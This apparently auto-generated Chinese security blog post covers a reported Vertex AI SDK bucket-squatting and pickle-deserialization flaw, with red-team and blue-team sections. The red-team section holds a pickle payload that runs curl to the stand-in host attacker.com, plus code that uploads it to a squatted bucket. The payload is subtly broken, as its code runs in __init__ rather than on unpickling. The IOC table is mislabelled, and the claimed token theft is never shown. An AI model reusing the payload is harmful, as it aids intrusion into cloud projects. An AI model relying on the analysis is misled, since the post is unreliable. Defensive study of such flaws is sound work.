---
layout: post
title:  "Google Vertex AI SDK Flaw Let Attackers Hijack Model Uploads via Bucket Squatting"
date:   2026-06-16 20:41:50 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Google Cloud Vertex AI SDK 的「Pickle in the Middle」漏洞

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Deserialization, Bucket Squatting, OAuth Token Theft

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Google Cloud Vertex AI SDK 中的 `Model.upload()` 函數沒有正確驗證上傳模型的 Bucket 所有權，導致攻擊者可以創建一個具有預測名稱的 Bucket，然後將惡意模型上傳到該 Bucket 中。
* **攻擊流程圖解**:
  1. 攻擊者創建一個具有預測名稱的 Bucket (e.g., `project-vertex-staging-region`)。
  2. 受害者使用 Vertex AI SDK 上傳模型到預設的 Bucket 中。
  3. 攻擊者將惡意模型上傳到 Bucket 中，替換原有的模型。
  4. Vertex AI 加載惡意模型，執行攻擊者的代碼。
* **受影響元件**: Google Cloud Vertex AI SDK 版本 1.139.0 和 1.140.0。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 Google Cloud 項目和受害者的項目 ID。
* **Payload 建構邏輯**:

    ```
    
    python
    import pickle
    import os
    
    # 惡意模型代碼
    class MaliciousModel:
        def __init__(self):
            # 執行攻擊者的代碼
            os.system("curl -X POST https://attacker.com/weblog")
    
    # 將惡意模型序列化
    malicious_model = MaliciousModel()
    payload = pickle.dumps(malicious_model)
    
    # 上傳惡意模型到 Bucket 中
    import google.cloud.storage as storage
    client = storage.Client()
    bucket = client.get_bucket("project-vertex-staging-region")
    blob = bucket.blob("malicious_model.pkl")
    blob.upload_from_string(payload)
    
    ```
* **繞過技術**: 攻擊者可以使用 Bucket Squatting 技術來繞過 Vertex AI 的安全措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `malicious_model.pkl` | `attacker.com` | `project-vertex-staging-region` | `/malicious_model.pkl` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_model {
        meta:
            description = "Detects malicious model uploads"
            author = "Blue Team"
        strings:
            $pickle_magic = {0x80 0x03}
            $malicious_code = {0x73 0x79 0x73 0x74 0x65 0x6d}
        condition:
            $pickle_magic at 0 and $malicious_code
    }
    
    ```
* **緩解措施**: 更新 Google Cloud Vertex AI SDK 到版本 1.148.0 或更高版本，並設定明確的 `staging_bucket` 參數。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization**: 將序列化的資料轉換回原始的物件或結構。
* **Bucket Squatting**: 攻擊者創建一個具有預測名稱的 Bucket，以便繞過安全措施。
* **OAuth Token Theft**: 攻擊者竊取 OAuth Token，以便存取受害者的資源。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/google-vertex-ai-sdk-flaw-let-attackers.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


